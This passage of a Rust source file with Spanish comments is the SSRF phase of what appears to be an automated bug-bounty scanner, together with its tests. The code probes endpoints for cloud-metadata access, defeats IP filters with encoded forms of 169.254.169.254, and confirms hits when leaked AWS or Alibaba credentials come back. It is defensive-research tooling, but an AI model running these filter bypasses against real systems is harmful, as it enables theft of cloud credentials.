/// Procesa UN endpoint: caza adaptativa, y si confirma, persiste el hallazgo
/// (mismo formato que la SSRF estática: `insert_finding_dedup`, severidad
/// crítica, CWE-918), guarda la secuencia ganadora en la memoria, y notifica.
/// Genérico sobre `Sonda` para probar la persistencia sin salir a la red.
/// Devuelve `true` si nació un hallazgo NUEVO.
#[allow(clippy::too_many_arguments)] // persistencia + caza + memoria + anti-baneo
pub async fn procesar_url<S: Sonda>(
    pool: &SqlitePool,
    program: &str,
    program_id: i64,
    url_objetivo: &str,
    sonda: &S,
    tope: u32,
    webhook: Option<&str>,
    guard: &mut Guard,
    pausa_secs: u64,
    rng: &mut impl FnMut() -> f64,
    // Enforcement de la memoria negativa: `Some(ttl_secs)` salta lo agotado no
    // caducado; `None` apagado. Del flag `NEXUS_EXCLUSIONES_ENFORCE` + TTL.
    enforce_ttl: Option<i64>,
    objetivos: &[Objetivo],
) -> Result<bool> {
    let host = crate::scope::host_of(url_objetivo);
    match cazar_ssrf(sonda, tope, Some(Memoria { pool, host: &host, program_name: program, enforce_ttl }), guard, pausa_secs, rng, objetivos).await {
        Resultado::Confirmado { payload_ganador, familia, proveedor, huella, .. } => {
            let evidencia = format!(
                "SSRF a metadata {proveedor} vía {} (adaptativo): el endpoint {url_objetivo} \
                 exfiltró un token distintivo del proveedor al buscar {payload_ganador} — \
                 confirmado por contenido, vencido un filtro que bloquea la IP literal.",
                familia.nombre()
            );
            let nf = crate::db::NewFinding {
                program_name: program.to_string(),
                vuln_name: format!("ssrf-metadata-{}", proveedor.to_ascii_lowercase()),
                severity: "critical".to_string(),
                // La url identifica al ENDPOINT VÍCTIMA (dedup por endpoint, no por
                // payload: el payload de metadata es idéntico entre víctimas y
                // colapsaría hallazgos distintos). El payload ganador —cómo se
                // reproduce— va en la evidencia.
                url: url_objetivo.to_string(),
                cwe: Some("CWE-918".to_string()),
                evidencia: Some(evidencia.clone()),
            };
            let nuevo = crate::db::insert_finding_dedup(pool, &nf, program_id).await?;
            // Recordar la secuencia SIEMPRE que el oráculo confirmó, aunque el
            // hallazgo ya existiera (revalida la mutación bajo la huella actual).
            let testigo = OraculoConfirmado::desde_ejecucion(true)
                .expect("exfiltración por contenido es ejecución confirmada");
            let mutacion = a_mutacion(familia, &payload_ganador);
            secuencias::guardar(
                pool, &testigo, program, &host, &huella, &mutacion, Some(&evidencia), None,
            )
            .await?;
            // Memoria NEGATIVA: este host YA no está agotado para SSRF —acabamos de
            // confirmar—, así que se borra cualquier veredicto negativo previo para
            // que no mienta a la próxima decisión (memoria `exclusiones`). NO-FATAL:
            // es bookkeeping; un hipo de BD aquí NO puede tumbar la caza NI —yendo
            // antes del `notify`— silenciar la alerta de este hallazgo crítico
            // (observación de la revisión, 2026-08-24).
            if let Err(e) = crate::exclusiones::limpiar(pool, &host, "ssrf").await {
                tracing::warn!("exclusiones: no pude limpiar {host}/ssrf tras confirmar: {e}");
            }
            if nuevo {
                let _ = crate::notify::notificar(
                    webhook,
                    &crate::notify::Evento::Hallazgos(vec![crate::notify::HallazgoBreve {
                        severity: "critical".into(),
                        vuln_type: format!("ssrf-metadata-{proveedor}"),
                        url: payload_ganador,
                        program_name: program.to_string(),
                    }]),
                )
                .await;
            }
            Ok(nuevo)
        }
        Resultado::Seco { clase_final, huella, intentos } => {
            // Positivo de control (directiva 30): el negativo dice que el camino
            // se recorrió y por qué calló, no un silencio indistinguible de no-op.
            tracing::debug!(
                "arnm: {url_objetivo} seco tras {intentos} sonda(s) — filtro {clase_final:?} no cedió"
            );
            // Memoria NEGATIVA por causa: el arsenal ESTÁTICO se agotó contra este
            // host (MetodosAgotados). Se registra bajo la `huella` de la FASE 1 que
            // trae el Seco —NO `huella_filtro(clase_final)`, que puede haber derivado
            // a SinExfiltracion— para que el reader del enforcement (que lee la
            // huella de fase 1) la reencuentre (obs. de la revisión, 2026-08-24). Su
            // política es «cola de generación», no «repetir el arsenal». NO-FATAL: un
            // fallo de este bookkeeping no convierte un benigno "seco" en abortar la
            // fase entera (observación de la revisión).
            if let Err(e) = crate::exclusiones::registrar(
                pool, &host, "ssrf", crate::exclusiones::Causa::MetodosAgotados, &huella,
            )
            .await
            {
                tracing::warn!("exclusiones: no pude registrar {host}/ssrf agotado: {e}");
            }
            Ok(false)
        }
        Resultado::Detenido { motivo, intentos } => {
            // El guard cortó por baneo. El estado de `should_pause` persiste en el
            // guard COMPARTIDO, así que la fase lo verá y parará de raíz (no es
            // trabajo de este endpoint decidirlo). Se registra como inoperabilidad
            // TRANSITORIA (rate-limit pasajero → reintentar normal), no como métodos
            // agotados: no probamos el arsenal entero, nos frenaron antes.
            tracing::warn!("arnm: {url_objetivo} DETENIDO tras {intentos} sonda(s) — {motivo}");
            // NO-FATAL (como los otros brazos). La huella aquí es un marcador
            // constante y no la postura real del host: es inofensivo porque la
            // política de InoperabilidadTransitoria es Reintentar{1} case o no la
            // huella (no depende de la comparación) — ver el contrato de huella en
            // `exclusiones::registrar`.
            if let Err(e) = crate::exclusiones::registrar(
                pool, &host, "ssrf", crate::exclusiones::Causa::InoperabilidadTransitoria,
                "detenido-baneo",
            )
            .await
            {
                tracing::warn!("exclusiones: no pude registrar {host}/ssrf detenido: {e}");
            }
            Ok(false)
        }
        Resultado::Saltado { causa, huella, intentos } => {
            // La memoria negativa evitó la búsqueda cara: bajo la MISMA huella ya
            // sabíamos que el arsenal no cede. Observable (directiva 30): se dice
            // que saltamos y por qué causa — «saltado» ≠ «seco» ≠ «no corrió». NO se
            // re-registra: el veredicto que motivó el salto ya está en la tabla (y
            // re-registrar refrescaría su timestamp escondiendo su antigüedad).
            tracing::info!(
                "arnm: {url_objetivo} SALTADO por memoria negativa ({causa:?}, huella {huella}) \
                 tras {intentos} sonda(s) literal(es) — arsenal agotado bajo esta postura, no repito"
            );
            Ok(false)
        }
    }
}

/// La FASE adaptativa de SSRF que corre en la caza: sobre las URLs
/// parametrizadas, con transporte HTTP real. Reemplaza a `ssrf::fase_ssrf`
/// (estática) en el ciclo — cuando el filtro bloquea la IP literal, ADAPTA en vez
/// de salir seco. `tope` acota las sondas por endpoint (protege la IP compartida
/// del VPS: el hacker es preciso, no ruidoso). Devuelve cuántos hallazgos NUEVOS.
/// Pausa entre sondas de un mismo endpoint (anti-ráfaga). Igual que la
/// `PAUSA_TECNICA_SECS` de autz: 1s con jitter. En tests, 0.
pub const PAUSA_SONDA_SECS: u64 = 1;
/// Enfriamiento entre endpoints distintos.
pub const COOLDOWN_ENDPOINT_SECS: u64 = 2;

#[allow(clippy::too_many_arguments)] // fase real: corpus + presupuesto + anti-baneo + deadline
pub async fn fase_ssrf_adaptativa(
    pool: &SqlitePool,
    program: &str,
    urls_param: &[String],
    max: usize,
    tope: u32,
    webhook: Option<&str>,
    deadline: Option<std::time::Instant>,
    // Enforcement de la memoria negativa: `Some(ttl_secs)` salta lo agotado no
    // caducado por antigüedad; `None` apagado.
    enforce_ttl: Option<i64>,
    // Directorio de templates de nuclei: de él se cargan objetivos de metadata
    // ADICIONALES (la inversión). Vacío = solo el catálogo base multi-nube.
    nuclei_dir: &str,
) -> Result<usize> {
    let cliente = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(std::time::Duration::from_secs(12))
        .user_agent(crate::evasion::UA_POOL[0])
        .build()?;
    let program_id = crate::db::upsert_program(pool, program).await?;
    // OBJETIVOS: catálogo base multi-nube + los que curó nuclei (la inversión,
    // igual que XSS). Falla suave: si el dir no está o va vacío, quedan los 6 base.
    let mut objetivos = objetivos_base();
    if !nuclei_dir.is_empty() {
        let extra = crate::nuclei_moldes::cargar_objetivos_metadata(
            std::path::Path::new(nuclei_dir),
            SSRF_NUCLEI_CAP,
        );
        if !extra.is_empty() {
            tracing::info!("ssrf: {} objetivos de metadata de nuclei cargados (la inversión)", extra.len());
            for (ip, ruta) in extra {
                if !objetivos.iter().any(|o| o.ip == ip && o.ruta == ruta) {
                    objetivos.push(Objetivo { ip, ruta });
                }
            }
        }
    }
    // Guard COMPARTIDO entre todos los endpoints: un baneo acumulado en uno frena
    // la fase entera — protege la IP compartida del VPS (medico, xiliux, OPRF…).
    let mut guard = Guard::new(crate::protection::ProtectionConfig::default());
    let mut rng = {
        use rand::Rng;
        let mut r = rand::rng();
        move || r.random::<f64>()
    };
    let mut n = 0usize;
    for url in urls_param.iter().take(max) {
        // Presupuesto del ciclo: no seguir moliendo tras el deadline (como
        // fase_bypass — evita que la fase se coma el TimeoutStartSec de systemd).
        if crate::autz::deadline_vencido(deadline) {
            tracing::info!("arnm: presupuesto del ciclo agotado — paro la fase SSRF ({n} hallazgos)");
            break;
        }
        // Cortacircuitos: si el objetivo nos frenó (429/503 acumulados), PARAMOS
        // toda la fase. Un baneo cae sobre la IP de TODOS los proyectos.
        if guard.should_pause() {
            tracing::warn!("arnm: PAUSA por rate-limit acumulado — protejo la IP compartida del VPS");
            break;
        }
        let sonda = SondaHttp { cliente: &cliente, url_objetivo: url.clone() };
        if procesar_url(
            pool, program, program_id, url, &sonda, tope, webhook,
            &mut guard, PAUSA_SONDA_SECS, &mut rng, enforce_ttl, &objetivos,
        )
        .await?
        {
            n += 1;
        }
        // Enfriamiento entre endpoints (con jitter): no ráfaga de endpoint en endpoint.
        tokio::time::sleep(guard.cooldown(COOLDOWN_ENDPOINT_SECS, rng())).await;
    }
    Ok(n)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Guard permisivo para tests que no ejercen el anti-baneo (nunca se frena
    /// sin señales de baneo). Pausa 0 y rng fijo → sin sleeps reales.
    fn guard_test() -> Guard {
        Guard::new(crate::protection::ProtectionConfig::default())
    }

    /// Los 4 objetivos ORIGINALES (todos en la IP de AWS), para que los tests que
    /// asertan conteos exactos de sondas se comporten igual que antes del multi-nube.
    fn objetivos_aws() -> Vec<Objetivo> {
        objetivos_base().into_iter().take(4).collect()
    }

    // ---- Mutadores: el par verde/rojo sobre la propiedad "misma IP" ----

    #[test]
    fn toda_variante_ip_resuelve_a_la_misma_direccion() {
        // VERDE: cada codificación entera/mapeada debe decodificar a 169.254.169.254.
        let ip = IP_METADATA;
        let n = u32::from(ip);
        assert_eq!(Ipv4Addr::from(n), ip, "decimal");
        assert_eq!(Ipv4Addr::from(0xa9fea9feu32), ip, "hex");
        // Octal por octeto: 0251=169, 0376=254.
        assert_eq!(u8::from_str_radix("251", 8).unwrap(), 169);
        assert_eq!(u8::from_str_radix("376", 8).unwrap(), 254);
        // La lista incluye las formas esperadas.
        let vs = variantes_ipv4(ip);
        assert!(vs.contains(&"2852039166".to_string()), "decimal entero presente");
        assert!(vs.contains(&"0xa9fea9fe".to_string()), "hex entero presente");
        assert!(vs.iter().any(|v| v.contains("0251.0376.0251.0376")), "octal presente");
    }

    #[test]
    fn ninguna_variante_apunta_a_otra_ip() {
        // ROJO por la vía real: si un mutador emitiera una codificación de OTRA
        // dirección, se le enviaría tráfico a un tercero. Verifica que la forma
        // decimal NO es la de, p. ej., 169.254.169.253.
        let vs = variantes_ipv4(IP_METADATA);
        let otra = u32::from(Ipv4Addr::new(169, 254, 169, 253)).to_string();
        assert!(!vs.contains(&otra), "ninguna variante debe codificar una IP distinta");
    }

    // ---- Clasificación + contra-mutación: precisión ----

    #[test]
    fn clasifica_filtro_de_destino_y_elige_recodificar() {
        let clase = clasificar_bloqueo(403, "Blocked host: internal address not allowed");
        assert_eq!(clase, ClaseBloqueo::FiltroDestino);
        // Contra un filtro de destino, la primera contra-mutación es recodificar la IP.
        assert_eq!(contramutaciones(clase)[0], Familia::CodificacionIp);
    }

    #[test]
    fn sin_exfiltracion_no_desperdicia_mutaciones() {
        // Un 200 sin metadata: no hay filtro que vencer variando el destino → no
        // se rocía nada (precisión).
        let clase = clasificar_bloqueo(200, "<html>ok</html>");
        assert_eq!(clase, ClaseBloqueo::SinExfiltracion);
        assert!(contramutaciones(clase).is_empty());
    }

    // ---- El BUCLE, cruzando la frontera contra un objetivo sintético ----

    /// Un objetivo que FILTRA la IP literal (la bloquea por cadena) pero es
    /// vulnerable si el destino llega codificado: exactamente el caso que el
    /// `ssrf.rs` estático NO resuelve y el adaptativo sí.
    struct FiltraLiteralPeroVulnerableACodificacion;
    impl Sonda for FiltraLiteralPeroVulnerableACodificacion {
        async fn pedir(&self, payload: &str) -> Option<(u16, String)> {
            // El payload viaja url-encoded en un parámetro real; para el objetivo
            // sintético lo miramos crudo (equivale a lo que el endpoint fetch-ea).
            if payload.contains("169.254.169.254") {
                // Filtro por cadena literal: rechaza.
                return Some((403, "Blocked host: internal address not allowed".to_string()));
            }
            // Cualquier otra codificación del destino que apunte a metadata:
            // el endpoint la resuelve y exfiltra credenciales AWS reales.
            if payload.contains("2852039166")
                || payload.contains("0xa9fea9fe")
                || payload.contains("0251.0376")
                || payload.contains("::ffff:")
                || payload.contains("nip.io")
            {
                let cuerpo = r#"{"Code":"Success","AccessKeyId":"ASIAEXAMPLE","SecretAccessKey":"secret"}"#;
                return Some((200, cuerpo.to_string()));
            }
            Some((200, "<html>ok</html>".to_string()))
        }
    }

    #[tokio::test]
    async fn verde_adapta_y_confirma_donde_el_estatico_se_seca() {
        let sonda = FiltraLiteralPeroVulnerableACodificacion;
        let r = cazar_ssrf(&sonda, 100, None, &mut guard_test(), 0, &mut || 0.5, &objetivos_aws()).await;
        match r {
            Resultado::Confirmado { familia, proveedor, payload_ganador, .. } => {
                assert_eq!(proveedor, "AWS");
                assert_ne!(familia, Familia::Literal, "el literal se filtra; ganó una mutación");
                assert!(!payload_ganador.contains("169.254.169.254"), "el ganador va codificado");
            }
            Resultado::Seco { .. } => panic!("el adaptativo DEBE vencer un filtro por cadena literal"),
            Resultado::Detenido { .. } => panic!("sin señales de baneo no debe detenerse"),
            Resultado::Saltado { .. } => panic!("sin enforce (memoria None) no puede saltar"),
        }
    }

    /// Un objetivo que REFLEJA el payload en un error: el FP que la revisión de
    /// seguridad del 2026-08-23 cazó. El bucle NO debe confirmarlo (usa el oráculo
    /// endurecido). Mutante que mata: un bucle que confirmara por "la respuesta
    /// contiene la IP/host de metadata" daría verde aquí.
    struct ReflejaElPayload;
    impl Sonda for ReflejaElPayload {
        async fn pedir(&self, payload: &str) -> Option<(u16, String)> {
            Some((200, format!("Error fetching {payload}: connection refused")))
        }
    }

    #[tokio::test]
    async fn rojo_reflexion_no_se_confirma() {
        let sonda = ReflejaElPayload;
        match cazar_ssrf(&sonda, 100, None, &mut guard_test(), 0, &mut || 0.5, &objetivos_aws()).await {
            Resultado::Seco { .. } => { /* correcto: reflexión no es exfiltración */ }
            Resultado::Confirmado { .. } => {
                panic!("reflexión del payload NO es SSRF — no debe confirmarse (FP 2026-08-23)")
            }
            Resultado::Detenido { .. } => panic!("sin señales de baneo no debe detenerse"),
            Resultado::Saltado { .. } => panic!("sin enforce (memoria None) no puede saltar"),
        }
    }

    #[tokio::test]
    async fn la_reserva_deja_correr_la_adaptacion_con_muchos_objetivos() {
        // Muchos objetivos (24) y tope PEQUEÑO (10): sin la reserva, los literales
        // agotarían el presupuesto y la adaptación —el valor de arnm— nunca correría.
        // El host filtra el literal pero cede a la codificación de IP; con la reserva
        // (RESERVA_ADAPTACION=6, límite literal=4) quedan 6 sondas para adaptar.
        let muchos: Vec<Objetivo> = (0..24)
            .map(|i| Objetivo { ip: IP_METADATA, ruta: format!("/p{i}/meta") })
            .collect();
        let r = cazar_ssrf(&FiltraLiteralPeroVulnerableACodificacion, 10, None, &mut guard_test(), 0, &mut || 0.5, &muchos).await;
        assert!(
            matches!(r, Resultado::Confirmado { familia, .. } if familia != Familia::Literal),
            "la adaptación confirmó pese a los 24 objetivos: {r:?}"
        );
    }

    /// Exfiltra SOLO cuando la sonda apunta a la IP de metadata de Alibaba: prueba
    /// que el catálogo BASE multi-nube alcanza un proveedor que los 4 originales
    /// (solo AWS) jamás tocaban. El token distintivo va en el cuerpo.
    struct SoloAlibabaExfiltra;
    impl Sonda for SoloAlibabaExfiltra {
        async fn pedir(&self, payload: &str) -> Option<(u16, String)> {
            if payload.contains("100.100.100.200") {
                let cuerpo = r#"{"AccessKeyId":"STS.x","AccessKeySecret":"y","SecurityToken":"z"}"#;
                return Some((200, cuerpo.to_string()));
            }
            Some((200, "<html>ok</html>".to_string()))
        }
    }

    #[tokio::test]
    async fn verde_multicloud_confirma_alibaba() {
        // Con `objetivos_base()` (6) se prueba el objetivo de Alibaba; con los 4 de
        // AWS jamás se alcanzaría. Es la capacidad que abre la Fase 0.2.
        let r = cazar_ssrf(&SoloAlibabaExfiltra, 100, None, &mut guard_test(), 0, &mut || 0.5, &objetivos_base()).await;
        match r {
            Resultado::Confirmado { proveedor, familia, payload_ganador, .. } => {
                assert_eq!(proveedor, "Alibaba", "el proveedor confirmado es Alibaba");
                assert_eq!(familia, Familia::Literal, "el literal de Alibaba exfiltró sin filtro");
                assert!(payload_ganador.contains("100.100.100.200"), "el ganador apunta a la IP de Alibaba");
            }
            otro => panic!("esperaba Confirmado Alibaba, fue {otro:?}"),
        }
        // PAREJA (dir. 33): con SOLO los 4 objetivos de AWS, Alibaba es inalcanzable.
        let r2 = cazar_ssrf(&SoloAlibabaExfiltra, 100, None, &mut guard_test(), 0, &mut || 0.5, &objetivos_aws()).await;
        assert!(!matches!(r2, Resultado::Confirmado { .. }), "sin el objetivo Alibaba no hay confirmación");
    }

    /// Un objetivo que bloquea TODO (muro): el bucle se adapta, no cede, y sale
    /// SECO con positivo de control (dice la clase y los intentos).
    struct MuroTotal;
    impl Sonda for MuroTotal {
        async fn pedir(&self, _: &str) -> Option<(u16, String)> {
            Some((403, "Forbidden host".to_string()))
        }
    }

    #[tokio::test]
    async fn muro_total_sale_seco_con_positivo_de_control() {
        match cazar_ssrf(&MuroTotal, 100, None, &mut guard_test(), 0, &mut || 0.5, &objetivos_aws()).await {
            Resultado::Seco { clase_final, huella, intentos } => {
                assert_eq!(clase_final, ClaseBloqueo::FiltroDestino);
                assert!(intentos > 1, "se ADAPTÓ (probó variantes), no se rindió al primer bloqueo");
                // La huella del Seco es la ESTABLE de fase 1 (FiltroDestino), la
                // misma con que el enforcement releerá — no una derivada (obs. rev.).
                assert_eq!(huella, huella_filtro(ClaseBloqueo::FiltroDestino),
                    "el Seco lleva la huella estable de fase 1, no la derivada");
            }
            Resultado::Confirmado { .. } => panic!("un muro total no puede confirmar"),
            Resultado::Detenido { .. } => {
                panic!("un 403 NO es baneo — el muro se AGOTA (Seco), no detiene por rate-limit")
            }
            Resultado::Saltado { .. } => panic!("sin enforce (memoria None) no puede saltar"),
        }
    }

    /// Un objetivo que responde 429 (Too Many Requests) sostenido: el «para»
    /// explícito. La protección anti-baneo debe DETENER la fase (should_pause)
    /// para no degradar la IP COMPARTIDA del VPS — no seguir hostigando. Es la
    /// pareja de `muro_total` (403 → Seco): 429 y 403 son cosas DISTINTAS.
    struct SiempreBaneado;
    impl Sonda for SiempreBaneado {
        async fn pedir(&self, _: &str) -> Option<(u16, String)> {
            Some((429, "Too Many Requests".to_string()))
        }
    }

    #[tokio::test]
    async fn baneo_429_detiene_para_proteger_la_ip() {
        // backoff_base=0 → el sleep del backoff es 0 (el test no duerme de verdad).
        let cfg = crate::protection::ProtectionConfig {
            failure_backoff_base: 0,
            ..Default::default()
        };
        let mut guard = Guard::new(cfg);
        match cazar_ssrf(&SiempreBaneado, 100, None, &mut guard, 0, &mut || 0.5, &objetivos_aws()).await {
            Resultado::Detenido { intentos, .. } => {
                // max_consecutive_failures por defecto = 3 → detiene al 3.er 429,
                // no al primero (da margen a un pico transitorio).
                assert_eq!(intentos, 3, "detiene tras acumular 429, no al primero");
            }
            Resultado::Seco { .. } => {
                panic!("un 429 sostenido debe DETENER por anti-baneo, no agotarse en Seco")
            }
            Resultado::Confirmado { .. } => panic!("un 429 no exfiltra nada"),
            Resultado::Saltado { .. } => panic!("sin enforce (memoria None) no puede saltar"),
        }
    }

    /// El baneo llega A MITAD de la búsqueda: el literal pasa (403, filtro), pero
    /// las MUTACIONES disparan 429. Cubre la rama anti-baneo del bucle GENÉRICO
    /// (no solo la del literal): el freno funciona en plena adaptación.
    struct BaneaEnMutaciones;
    impl Sonda for BaneaEnMutaciones {
        async fn pedir(&self, payload: &str) -> Option<(u16, String)> {
            if payload.contains("169.254.169.254") {
                Some((403, "Blocked host: private ip".to_string())) // literal: filtro, no baneo
            } else {
                Some((429, "Too Many Requests".to_string())) // mutaciones: el objetivo nos frena
            }
        }
    }

    #[tokio::test]
    async fn baneo_a_mitad_de_la_busqueda_detiene() {
        let cfg = crate::protection::ProtectionConfig {
            failure_backoff_base: 0,
            ..Default::default()
        };
        let mut guard = Guard::new(cfg);
        match cazar_ssrf(&BaneaEnMutaciones, 100, None, &mut guard, 0, &mut || 0.5, &objetivos_aws()).await {
            Resultado::Detenido { intentos, .. } => {
                // 4 literales (403) + 3 mutaciones (429 → should_pause al 3.er).
                assert_eq!(intentos, 7, "para en la 3.ª mutación baneada, no antes ni después");
            }
            otro => panic!("el baneo a mitad de la búsqueda debe DETENER (no {})",
                matches!(otro, Resultado::Seco { .. }).then_some("Seco").unwrap_or("Confirmado")),
        }
    }

    // ---- El bucle recuerda: caza → guarda en secuencias ----

    async fn pool_migrado() -> SqlitePool {
        let pool = sqlx::sqlite::SqlitePoolOptions::new()
            .max_connections(1)
            .connect("sqlite::memory:")
            .await
            .unwrap();
        sqlx::migrate!("./migrations").run(&pool).await.unwrap();
        pool
    }

    #[tokio::test]
    async fn procesar_url_confirmado_persiste_hallazgo_y_secuencia() {
        let pool = pool_migrado().await;
        let program_id = crate::db::upsert_program(&pool, "prog").await.unwrap();
        let sonda = FiltraLiteralPeroVulnerableACodificacion;

        let nuevo = procesar_url(
            &pool, "prog", program_id,
            "https://victima.example.com/fetch?url=x", &sonda, 100, None,
            &mut guard_test(), 0, &mut || 0.5, None, &objetivos_aws(),
        )
        .await
        .unwrap();
        assert!(nuevo, "un acierto adaptativo nace como hallazgo nuevo");

        // Hallazgo persistido, crítico, con el payload codificado como url.
        let (vuln, sev, url): (String, String, String) = sqlx::query_as(
            "SELECT vuln_name, severity, url FROM findings LIMIT 1",
        )
        .fetch_one(&pool)
        .await
        .unwrap();
        assert_eq!(vuln, "ssrf-metadata-aws");
        assert_eq!(sev, "critical");
        assert_eq!(url, "https://victima.example.com/fetch?url=x", "el hallazgo identifica al endpoint víctima");
        // El payload que venció el filtro va en la evidencia (reproducible).
        let ev: String = sqlx::query_scalar("SELECT verification_evidence FROM findings LIMIT 1")
            .fetch_one(&pool).await.unwrap();
        assert!(!ev.contains("169.254.169.254") && (ev.contains("2852039166") || ev.contains("0xa9fea9fe") || ev.contains("0251.0376") || ev.contains("::ffff:")),
            "la evidencia trae el payload codificado que venció el filtro");

        // Secuencia recordada, llaveada al HOST víctima (no al payload).
        let n = secuencias::contar_vigentes(&pool, "victima.example.com").await.unwrap();
        assert_eq!(n, 1);
    }

    /// Camino A (Juan 2026-08-26): un MURO (403 a todo) YA NO sale con la biblioteca
    /// vacía. Las variantes amuralladas se registran para reciclar cross-host — pero
    /// SOLO como amuralladas: ni confirman (no exfiltró) ni cuentan como refutación
    /// servida (nunca se procesaron server-side). Antes este test exigía 0 secuencias:
    /// esa era la versión anterior de la regla, justo el punto muerto que sembraba 0
    /// filas en producción. Par discriminante por la vía REAL (procesar_url→Fase 2):
    ///   - findings = 0 (un muro no confirma);
    ///   - confirmadas = servidas = 0 (un muro no exfiltra ni se procesa);
    ///   - amuralladas > 0 (el muro SÍ alimenta la biblioteca — el corazón del camino A).
    /// Mata dos mutantes: el guard `status < 400` de antes (amuralladas=0) y uno que
    /// mande el muro a `veces_refutada` (servidas>0).
    #[tokio::test]
    async fn muro_persiste_amuralladas_para_reciclar_no_hallazgo() {
        let pool = pool_migrado().await;
        let program_id = crate::db::upsert_program(&pool, "prog").await.unwrap();
        let nuevo = procesar_url(
            &pool, "prog", program_id,
            "https://limpio.example.com/fetch?url=x", &MuroTotal, 100, None,
            &mut guard_test(), 0, &mut || 0.5, None, &objetivos_aws(),
        )
        .await
        .unwrap();
        assert!(!nuevo);
        let hallazgos: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM findings")
            .fetch_one(&pool).await.unwrap();
        assert_eq!(hallazgos, 0, "un muro no confirma: sin hallazgo");
        let confirmadas: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM secuencias WHERE veces_confirmada > 0")
            .fetch_one(&pool).await.unwrap();
        let servidas: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM secuencias WHERE veces_refutada > 0")
            .fetch_one(&pool).await.unwrap();
        let amuralladas: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM secuencias WHERE veces_amurallada > 0")
            .fetch_one(&pool).await.unwrap();
        assert_eq!((confirmadas, servidas), (0, 0), "un muro no confirma ni sirve nada");
        assert!(amuralladas > 0, "las variantes amuralladas SÍ se guardan para reciclar ({amuralladas})");
    }

    /// Un objetivo que SIRVE la petición (200) pero no exfiltra: cada variante
    /// generada es una refutación GENUINA y entra a la BIBLIOTECA (reforma
    /// 2026-08-26). Es la pareja del muro: allí 0 filas (bloqueo), aquí N filas
    /// (fracasos servidos, reciclables). Sin esta acumulación el motor nunca se
    /// nutre — la causa medida de las 0 filas históricas.
    /// Filtra la IP literal (403 → dispara la Fase 2 de generación) pero SIRVE las
    /// variantes codificadas con 200 y cuerpo benigno (sin metadata). Cada variante
    /// generada es entonces una refutación GENUINA (servida, no exfiltró) → biblioteca.
    struct FiltraLiteralSirveResto;
    impl Sonda for FiltraLiteralSirveResto {
        async fn pedir(&self, payload: &str) -> Option<(u16, String)> {
            if payload.contains("169.254.169.254") {
                Some((403, "Forbidden host".to_string())) // filtra el literal
            } else {
                Some((200, "<html><body>perfil de usuario</body></html>".to_string()))
            }
        }
    }

    #[tokio::test]
    async fn refutacion_servida_entra_a_la_biblioteca() {
        let pool = pool_migrado().await;
        let program_id = crate::db::upsert_program(&pool, "prog").await.unwrap();
        let nuevo = procesar_url(
            &pool, "prog", program_id,
            "https://sirve.example.com/fetch?url=x", &FiltraLiteralSirveResto, 100, None,
            &mut guard_test(), 0, &mut || 0.5, None, &objetivos_aws(),
        )
        .await
        .unwrap();
        assert!(!nuevo, "no exfiltró: no hay hallazgo");

        // NO hay findings (no confirmó), pero SÍ hay variantes refutadas guardadas.
        let hallazgos: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM findings")
            .fetch_one(&pool).await.unwrap();
        assert_eq!(hallazgos, 0, "servido-sin-fuga no es hallazgo");

        let refutadas: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM secuencias WHERE veces_refutada > 0 AND veces_confirmada = 0",
        )
        .fetch_one(&pool).await.unwrap();
        assert!(refutadas > 0, "los fracasos servidos entran a la biblioteca ({refutadas} variantes)");
        // Camino A: la sonda filtra el literal (403 → amurallada) y sirve el resto
        // (200 → refutada), así que la biblioteca acumula AMBAS caras.
        let amuralladas: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM secuencias WHERE veces_amurallada > 0 AND veces_confirmada = 0",
        )
        .fetch_one(&pool).await.unwrap();
        assert!(amuralladas > 0, "las variantes amuralladas también se guardan ({amuralladas})");

        // Todo lo probado (servido o amurallado) es RECICLABLE en OTRO host: la
        // biblioteca lo ofrece a un host nuevo que aún no lo intentó (el fin de
        // guardarlo — Juan 2026-08-26). No hay confirmadas aquí → total = reciclable.
        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM secuencias")
            .fetch_one(&pool).await.unwrap();
        let host_victima = crate::scope::host_of("https://sirve.example.com/fetch?url=x");
        let candidatas = secuencias::biblioteca(&pool, "ssrf-metadata", "otro-host.com", 500).await.unwrap();
        assert_eq!(candidatas.len() as i64, total, "todo fracaso (servido o amurallado) se recicla en otro host");
        // Pero NO al host que ya las intentó (no re-sugerir lo ya probado aquí).
        let para_mismo = secuencias::biblioteca(&pool, "ssrf-metadata", &host_victima, 500).await.unwrap();
        assert!(para_mismo.is_empty(), "no se recicla en el host que ya las probó");
    }

    /// Filtra TODO (403) salvo el payload-marcador reciclado, para el que exfiltra
    /// credenciales. Sirve para probar que la Fase 1.7 RE-LANZA: solo por esa vía
    /// puede confirmar (la Fase 2 no genera el marcador).
    struct SoloElMarcador;
    impl Sonda for SoloElMarcador {
        async fn pedir(&self, payload: &str) -> Option<(u16, String)> {
            if payload.contains("recicla-xyz") {
                Some((200, r#"{"Code":"Success","AccessKeyId":"ASIAEXAMPLE","SecretAccessKey":"secret"}"#.to_string()))
            } else {
                Some((403, "Forbidden".to_string()))
            }
        }
    }

    /// EL CASO ROJO DE LA FASE 1.7 (lo pidió sin-caso-rojo, dir. 33): el reciclaje
    /// de verdad RE-LANZA. Una variante confirmada en el host A se prueba y confirma
    /// en el host B por un payload-marcador que la Fase 2 NUNCA compone — así,
    /// revertir la Fase 1.7 deja a B SECO (confirmado=false) y el test se pone rojo.
    /// Es la prueba de que la biblioteca no solo GUARDA (refutacion_servida) sino
    /// que CONSUME lo guardado en otro sitio (el fin de la reforma, Juan 2026-08-26).
    #[tokio::test]
    async fn biblioteca_recicla_y_confirma_en_otro_host() {
        let pool = pool_migrado().await;
        let program_id = crate::db::upsert_program(&pool, "prog").await.unwrap();

        // Seed: variante GANADORA en host A, con un payload que la Fase 2 no genera.
        let testigo = OraculoConfirmado::desde_ejecucion(true).unwrap();
        let huella_seed = huella_filtro(ClaseBloqueo::FiltroDestino);
        let m = a_mutacion(Familia::HostAlterno, "http://recicla-xyz.interna/creds");
        secuencias::guardar(&pool, &testigo, "prog", "host-A.com", &huella_seed, &m, None, None)
            .await.unwrap();

        // Host B: solo el marcador reciclado confirma. Sin la Fase 1.7 nunca se
